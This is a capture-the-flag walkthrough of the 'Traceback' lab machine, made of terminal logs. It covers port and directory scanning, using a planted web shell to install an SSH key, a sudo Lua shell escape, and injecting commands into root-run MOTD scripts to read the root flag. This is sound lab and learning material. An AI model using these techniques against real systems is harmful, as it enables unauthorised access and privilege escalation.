root@Blue3:/blue3/CTF# nmap -sC -sV -A -p- 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 16:57 +07
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.035s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/27%OT=22%CT=1%CU=34794%PV=Y%DS=2%DC=T%G=Y%TM=5F1EA54
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   34.07 ms 10.10.14.1
2   34.70 ms traceback.htb (10.10.10.181)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.67 seconds

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

root@Blue3:/blue3/CTF# gobuster dir --url=http://traceback.htb -w common.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://traceback.htb
[+] Threads:        10
[+] Wordlist:       common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/27 17:21:21 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/smevk.php (Status: 200)
===============================================================
2020/07/27 17:21:56 Finished
===============================================================

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

root@Blue3:~# ssh-keygen -t rsa -C "blue3.do@gmail.com"
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:*** blue3.do@gmail.com
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|    +    .       |
| . =      E      |
|  +...o S. .     |
| . +o .=. +      |
|..+.* .o.+ o     |
| .=O=B+o+ o      |
| o*@XBB+ .       |
+----[SHA256]-----+
root@Blue3:~# cd /root/.ssh/
root@Blue3:~/.ssh# dlist
total 36
-rw-r--r--  1 root root  394 Aug 18  2019 authorized_keys
-rw-r--r--  1 root root 7092 Jul 27 16:24 known_hosts.old
-rw-------  1 root root 7536 Jul 27 17:34 known_hosts
drwxr-xr-x 49 root root 4096 Jul 27 17:40 ..
-rw-r--r--  1 root root  572 Jul 27 17:45 id_rsa.pub
-rw-------  1 root root 2602 Jul 27 17:45 id_rsa
drwxr-xr-x  2 root root 4096 Jul 27 17:45 .
root@Blue3:~/.ssh# cp id_rsa* /root/authorized_keys

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

=> Go to http://traceback.htb/smevk.php => This is the "backdoor" mentioned above.
=> Go to /home/webadmin/.ssh/
=> Delete the authorized_keys
=> Upload newly created "root/authorized_keys" to traceback server

root@Blue3:~# ssh webadmin@10.10.10.181 -i authorized_keys
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 30 00:07:58 2020 from 10.10.14.17
webadmin@traceback:~$


# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

webadmin@traceback:~$ ls -ltra
total 44
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
drwxrwxr-x 2 webadmin webadmin 4096 Jul 29 23:37 .ssh
-rw------- 1 webadmin webadmin  321 Jul 30 00:13 .bash_history
webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.

webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

So we have 2 pieces of information: Lua & sudo abusing using Lua + /home/sysadmin/lyvit can be access
=> Google it: Lua sudo abuse
=> https://gtfobins.github.io/gtfobins/lua/#sudo
Sudo

It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    sudo lua -e 'os.execute("/bin/sh")'

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/bash")
sysadmin@traceback:~$ whoami
sysadmin
sysadmin@traceback:~$ cd /home/sysadmin/
sysadmin@traceback:/home/sysadmin$ ls -ltra
total 4556
-rw-r--r-- 1 sysadmin sysadmin     807 Apr  4  2018 .profile
-rw-r--r-- 1 sysadmin sysadmin    3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 sysadmin sysadmin     220 Apr  4  2018 .bash_logout
-rwxrwxr-x 1 sysadmin sysadmin 4397566 Aug 24  2019 luvit
drwxrwxr-x 3 sysadmin sysadmin    4096 Aug 24  2019 .local
drwxr-xr-x 2 root     root        4096 Aug 25  2019 .ssh
drwx------ 2 sysadmin sysadmin    4096 Aug 25  2019 .cache
drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..
-rw------- 1 sysadmin sysadmin       1 Aug 25  2019 .bash_history
-rw------- 1 sysadmin sysadmin      33 Jul 29 22:05 user.txt
-rwxr-xr-x 1 sysadmin sysadmin  223835 Jul 29 23:41 linpeas.sh
drwxr-x--- 5 sysadmin sysadmin    4096 Jul 29 23:42 .
sysadmin@traceback:/home/sysadmin$ cat user.txt
********************************

=> We got the user!

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

After wondering around a lot, we can see the folder /etc has the folder update message of the day with owner is root but sysadmin can read & execute
sysadmin@traceback:/etc$ ls -ltra |grep update
-rw-r--r--  1 root root       403 Mar  1  2018 updatedb.conf
drwxr-xr-x  3 root root      4096 Aug 23  2019 update-manager
drwxr-xr-x  2 root sysadmin  4096 Aug 27  2019 update-motd.d
sysadmin@traceback:/etc$ cd update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ ls -ltra
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  299 Jul 30 00:27 91-release-upgrade
-rwxrwxr-x  1 root sysadmin  604 Jul 30 00:27 80-esm
-rwxrwxr-x  1 root sysadmin 4264 Jul 30 00:27 50-motd-news
-rwxrwxr-x  1 root sysadmin  982 Jul 30 00:27 10-help-text
-rwxrwxr-x  1 root sysadmin  981 Jul 30 00:27 00-header

# ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- ----- #

sysadmin@traceback:/etc/update-motd.d$ nano 00-header
Unable to create directory /home/webadmin/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

The file looks exact when we login as webadmin:
[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
# We add this to read the root.txt file as root
id
cat /root/root.txt

We try to login as webadmin in another Terminal to see if we can get the root.txt:
root@Blue3:~# ssh webadmin@10.10.10.181 -i authorized_keys
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 30 00:21:33 2020 from 10.10.14.17

We failed to do it. How about try it again??
root@Blue3:~# ssh webadmin@10.10.10.181 -i authorized_keys
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land

uid=0(root) gid=0(root) groups=0(root)
********************************


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 30 00:31:28 2020 from 10.10.14.17

Hmmm ... We got root?
Reference:
https://serverfault.com/questions/459229/is-it-possible-to-put-commands-in-etc-motd
In Ubuntu servers there is a program called update-motd from package libpam-modules:

    UNIX/Linux system adminstrators often communicate important information to console and remote users by maintaining text in the file /etc/motd, which is displayed by the pam_motd(8) module on interactive shell logins.

    Traditionally, this file is static text, typically installed by the distribution and only updated on release upgrades, or overwritten by the local administrator with pertinent information.

    Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled from a collection of scripts at login.

This collection of scripts lives under /etc/update-motd.d/. For more information see this wiki page.

Another alternative to generating /etc/motd, instead of having a script run at login is to have a cron job. Certainly, it is not the same, but I have met this approach sometimes in the past. Note however that this approach has been also used by update-motd, but it has been abandoned because of problem encountered. You can find a bit more info about this here.
